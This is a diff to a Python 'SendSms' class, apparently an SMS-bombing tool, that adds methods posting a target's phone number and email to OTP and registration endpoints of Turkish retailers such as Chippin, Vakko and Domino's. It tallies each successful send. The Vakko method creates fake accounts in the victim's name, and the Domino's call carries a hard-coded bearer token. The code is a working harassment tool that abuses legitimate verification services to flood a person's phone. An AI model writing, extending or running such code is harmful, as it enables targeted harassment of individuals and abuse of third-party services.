@@ -1,8 +1,10 @@
+from pickle import FALSE
 import requests
 from random import choice
 from string import ascii_lowercase
 from colorama import Fore, Style
-
+false = False
+true = True
 
 class SendSms():
     adet = 0
@@ -20,6 +22,58 @@ class SendSms():
 
 
 
+
+
+
+
+
+    #apigw.chippin.com by ever0ne
+    def Chippin(self):
+        try:
+            underarmour = requests.post("https://apigw.chippin.com/gsmVerification/generateGsmVerificationCode", 
+                                   headers={"DeviceId":"76e95ca596a1eb1b","User-Agent":"okhttp/4.10.0"},  
+                                   json={"gsm": self.phone})
+            if underarmour.status_code == 200:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> Chippin by ever0ne")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> Chippin by ever0ne")
+
+    #vakko.com by ever0ne
+    def Vakko(self):
+        try:
+            vakkoget = requests.get("https://www.vakko.com/csrf_token/?format=json")
+            csrftoken = (vakkoget.cookies.get_dict()["csrftoken"])
+            vakko = requests.post("https://www.vakko.com/vakko_app/users/registration/?format=json", 
+                            
+                                   headers={"Cookie":f"sessionid={vakkoget.cookies.get_dict()['sessionid']};csrftoken={csrftoken}","x-csrftoken": vakkoget.json()["csrf_token"],"X-App-Device":"android","User-Agent":"okhttp/4.10.0","Content-Type":"application/json"},  
+                                   json={"call_allowed": false,"confirm": true,"confirm_kvkk": true,"csrfmiddlewaretoken": vakkoget.json()["csrf_token"],"date_of_birth": "1999-01-01","email": self.mail,"email_allowed": false,"first_name": "AHMET","last_name": "BİLEN","password": "asdasd123A","phone": f"0{self.phone}","sms_allowed": false})
+            if vakko.json()['success'] == 'SMS gönderildi.':
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> Vakko by ever0ne")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> Vakko by ever0ne")
+
+
+    #frontend.dominos.com.tr by ever0ne
+    def Dominos(self):
+        try:
+            dominos = requests.post("https://frontend.dominos.com.tr/api/customer/sendOtpCode", 
+                                   headers={"authorization":"Bearer eyJhbGciOiJBMTI4S1ciLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwidHlwIjoiSldUIn0.BX34qfKYOZ6bx1UPMhB3de2qFM-R1l1oXpyKa_NzURkE3dI4qGGe5Q.Sa1Vih4fIDr6yxCcyHj2wA.qVyAYNf9nNOCCrmJAvZgl889UtmkyipBLMeWblJ8AQXolqMpuXoA8Ukx1DZKkLJ8BC8QAXn3oW3x52D51SFVp9FUeOE0cJwvd4Z5LUxypuuAECw4IkFqZ231da05z0JXidpdiLhT_mFjXj4iBD7D8bEQ5uMnVyLB6HKzRMJZl129iXjr1CxHdoZDkaN3aSv_7W7MQHHW7xihXurLnQcfe7I5exyOV_QQRoKlA9H04UHSNMDc2Gzs6alg9YGY7AOD-FtKePCTS-SPU6nz_yE7L7JeuG2KwIK4R3hmSHOlYSTNVG8SeXhGFyguAke_mQf7a6ocy-NumDSE39Eya6JqT6_pJc1uiidzGlPcBoRLVfhxRp0qsK5Wf5itAWg0q3ztc1T-daAMYUjlsc50rrNBjxpr4hfLoX2EXmAlN5t7We6T8K0cDtNxfNlkktrPMNpa3KeiHrqq0RehSrPC3X_i2RWGZjsm8Bjpywl6rcFHxLZZiDp1rdVuQrTdY1NQz5m_JzTWKg0GqXsrgeQp_aFDeQ.GPze6IpDWf5zyBzgI2kHpw","User-Agent":"okhttp/4.10.0"},  
+                                   json={"mobilePhone": self.phone,"isSure": "true","email": self.mail})
+            if dominos.json()["isSuccess"] == True:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> Dominos by ever0ne")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> Dominos by ever0ne")
+
+            
     #underarmour.com.tr by ever0ne
     def UnderArmour(self):
         try:
@@ -34,6 +88,7 @@ class SendSms():
         except:
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> UnderArmour by ever0ne")
 
+            
     #mobileapi-redesign.boyner.com.tr by ever0ne
     def Boyner(self):
         try:
@@ -48,6 +103,7 @@ class SendSms():
         except:
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> Boyner by ever0ne")
 
+            
     #mobileapp.lcwaikiki.com by ever0ne
     def LcWaikiki(self):
         try:
@@ -734,4 +790,3 @@ class SendSms():
         except:
             print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.yuffi.co")
         
-
